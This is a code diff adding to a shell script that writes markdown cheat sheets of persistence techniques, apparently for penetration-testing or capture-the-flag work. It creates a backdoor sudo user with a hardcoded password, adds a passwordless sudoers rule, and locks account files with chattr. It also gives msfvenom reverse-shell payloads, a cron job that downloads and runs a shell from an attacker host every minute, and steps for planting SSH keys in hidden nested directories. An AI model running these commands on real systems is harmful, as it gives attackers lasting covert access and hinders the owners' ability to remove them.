@@ -793,6 +793,143 @@ docker run -v \"./\":/work -t pwncat $box_ip LPORT
 export scripts_dir='/opt/server/ps_scripts/'; export exe_dir='/opt/server/exe/'; docker run --rm -ti --name evil-winrm -v \${scripts_dir}:/ps1_scripts -v \${exe_dir}:/exe_files -v \${pwd}:/data oscarakaelvis/evil-winrm
 \`\`\`" > ${loc}/cmds2run/host-specific/6-other_services.md
 
+echo -e "
+## Linux Specific
+
+### Add User Account
+
+\`\`\`
+
+adduser rooot << EOF
+toortoor
+toortoor
+
+
+
+
+
+
+EOF
+
+usermod -aG sudo rooot
+\`\`\`
+
+**Add the following line to */etc/sudoers***
+
+\`\`\`
+root    ALL=NOPASSWD: ALL
+\`\`\`
+
+Now run the following commands:
+
+\`\`\`
+chattr +i /etc/sudoers
+chattr +i /etc/passwd
+chattr +i /etc/shadow
+\`\`\`
+
+
+If needing to undo a chattr, run the following:
+
+\`\`\`
+chattr -i <file>
+\`\`\`
+
+Download chattr deb package:
+
+\`\`\`
+https://pkgs.org/download/e2fsprogs
+\`\`\`
+
+
+\`\`\`
+
+## MSFvenom
+
+
+\`\`\`
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$attack_ip LPORT=4321 -f elf -o shell.elf
+
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=$attack_ip LPORT=4321 -f elf -o shell.elf
+\`\`\`
+
+
+## Crontab
+
+
+\`\`\`
+crontab -e
+
+wget http://${attacker_ip}/shell -O /dev/shm/shell.elf
+
+
+* * * * * /dev/shm/shell.elf
+
+\`\`\`
+
+
+## SSH Persistence
+
+**Authorize attacker pub key**
+
+On attacker:
+
+\`\`\`
+cat /home/kali/.ssh/sshctf.pub | xclip -selection clipboard
+\`\`\`
+
+On target:
+
+\`\`\`
+echo "<key>" > /root/.ssh/authorized_keys
+\`\`\`
+
+**Generate A Key - ed**
+
+\`\`\`
+export tmp=".o"
+mkdir $tmp
+for i in {1..50}; do export tmp="${tmp}/.o"; mkdir /dev/shm/${tmp}; done
+ssh-keygen -t ed25519 -C root@box.local << EOF
+/dev/shm/${tmp}/rooot
+
+
+EOF
+
+eval `ssh-agent -s`
+ssh-add /dev/shm/${tmp}/rooot
+\`\`\`
+
+**Generate A Key - rsa**
+\`\`\`
+
+export tmp=".o"
+mkdir $tmp
+for i in {1..50}; do export tmp="${tmp}/.o"; mkdir /dev/shm/${tmp}; done
+ssh-keygen -t rsa -C root@box.local << EOF
+/dev/shm/${tmp}/rooot
+
+
+EOF
+
+eval `ssh-agent -s`
+ssh-add /dev/shm/${tmp}/rooot
+cat /dev/shm/${tmp}/rooot
+\`\`\`
+" > ${loc}/cmds2run/ip-specific/persis-lin.md
+
+echo -e "
+
+## MSFVenom
+
+\`\`\`
+msfvenom -p windows/shell_reverse_tcp LHOST=$attack_ip LPORT=4321 -f c -o shell.c
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$attack_ip LPORT=4321 -f exe -o shell.exe
+\`\`\`
+
+" > ${loc}/cmds2run/ip-specific/persis-win.md
 }
 
 ##############################
